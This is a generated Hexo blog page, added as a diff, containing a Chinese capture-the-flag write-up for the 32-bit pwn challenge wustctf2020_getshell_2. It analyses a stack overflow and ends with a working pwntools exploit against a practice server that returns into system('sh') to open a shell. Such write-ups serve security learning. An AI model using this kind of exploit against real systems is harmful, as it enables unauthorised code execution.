@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>wustctf2020_getshell_2 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="wustctf2020_getshell_2先checksec一下  ok，32位，开了NX保护丢到ida里看看  ok，很简洁，但有vulnerable函数，进去看看  也很简洁，就一个read函数，可以输入0x24个字节，栈的大小为0x18，可以溢出0x24-0x18-4&#x3D;8个字节，显然不是那么简单的溢出  这里有个shell函数，里面有system，但没有&#x2F;bin&#x2F;sh字符串，但是我们可以看">
+<meta property="og:type" content="article">
+<meta property="og:title" content="wustctf2020_getshell_2">
+<meta property="og:url" content="http://example.com/2022/01/30/wustctf2020-getshell-2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="wustctf2020_getshell_2先checksec一下  ok，32位，开了NX保护丢到ida里看看  ok，很简洁，但有vulnerable函数，进去看看  也很简洁，就一个read函数，可以输入0x24个字节，栈的大小为0x18，可以溢出0x24-0x18-4&#x3D;8个字节，显然不是那么简单的溢出  这里有个shell函数，里面有system，但没有&#x2F;bin&#x2F;sh字符串，但是我们可以看">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/01/30/wustctf2020-getshell-2/1.png">
+<meta property="og:image" content="http://example.com/2022/01/30/wustctf2020-getshell-2/2.png">
+<meta property="og:image" content="http://example.com/2022/01/30/wustctf2020-getshell-2/3.png">
+<meta property="og:image" content="http://example.com/2022/01/30/wustctf2020-getshell-2/4.png">
+<meta property="og:image" content="http://example.com/2022/01/30/wustctf2020-getshell-2/5.png">
+<meta property="og:image" content="http://example.com/2022/01/30/wustctf2020-getshell-2/6.png">
+<meta property="og:image" content="http://example.com/2022/01/30/wustctf2020-getshell-2/7.png">
+<meta property="article:published_time" content="2022-01-30T12:52:46.000Z">
+<meta property="article:modified_time" content="2022-01-31T04:57:58.549Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/01/30/wustctf2020-getshell-2/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-wustctf2020-getshell-2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/01/30/wustctf2020-getshell-2/" class="article-date">
+  <time class="dt-published" datetime="2022-01-30T12:52:46.000Z" itemprop="datePublished">2022-01-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      wustctf2020_getshell_2
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a>wustctf2020_getshell_2</h2><p>先<code>checksec</code>一下</p>
+<p><img src="/2022/01/30/wustctf2020-getshell-2/1.png"></p>
+<p>ok，<code>32位</code>，开了<code>NX</code>保护<br>丢到<code>ida</code>里看看</p>
+<p><img src="/2022/01/30/wustctf2020-getshell-2/2.png"></p>
+<p>ok，很简洁，但有<code>vulnerable</code>函数，进去看看</p>
+<p><img src="/2022/01/30/wustctf2020-getshell-2/3.png"></p>
+<p>也很简洁，就一个<code>read</code>函数，可以输入<code>0x24</code>个字节，栈的大小为<code>0x18</code>，可以溢出<code>0x24-0x18-4=8</code>个字节，显然不是那么简单的溢出</p>
+<p><img src="/2022/01/30/wustctf2020-getshell-2/4.png"></p>
+<p>这里有个<code>shell</code>函数，里面有<code>system</code>，但没有<code>/bin/sh</code>字符串，但是<br>我们可以看到有个<code>sh</code><br>所以我们试试用<code>ROPgadget</code>找找</p>
+<p><img src="/2022/01/30/wustctf2020-getshell-2/5.png"></p>
+<p>ok，还真有，这下简单了！<br>但是上面说了只能溢出8个字节，说以<code>system</code>函数只能用<code>sgell()</code>里面的<code>system call</code>，因为<code>system@plt</code>需要返回地址，<code>system call</code>不需要返回地址</p>
+<p><img src="/2022/01/30/wustctf2020-getshell-2/6.png"></p>
+<p>最后奉上exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level =<span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>,os =<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./wustctf2020_getshell_2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26053</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x08048529</span></span><br><span class="line">sh = <span class="number">0x08048670</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;a&#x27;</span>*<span class="number">28</span> + p32(system) + p32(sh)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/30/wustctf2020-getshell-2/7.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/01/30/wustctf2020-getshell-2/" data-id="ckz2fw2q600049kjxc15kdwag" data-title="wustctf2020_getshell_2" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/01/31/shellcode%E5%AD%A6%E4%B9%A0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          shellcode学习
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/01/30/unbuntu18-04pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">unbuntu18.04pwn环境搭建</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/01/31/shellcode%E5%AD%A6%E4%B9%A0/">shellcode学习</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/30/wustctf2020-getshell-2/">wustctf2020_getshell_2</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/30/unbuntu18-04pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">unbuntu18.04pwn环境搭建</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/25/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/25/%E6%B7%BB%E5%8A%A0%E6%A8%A1%E6%9D%BF/">添加模板</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
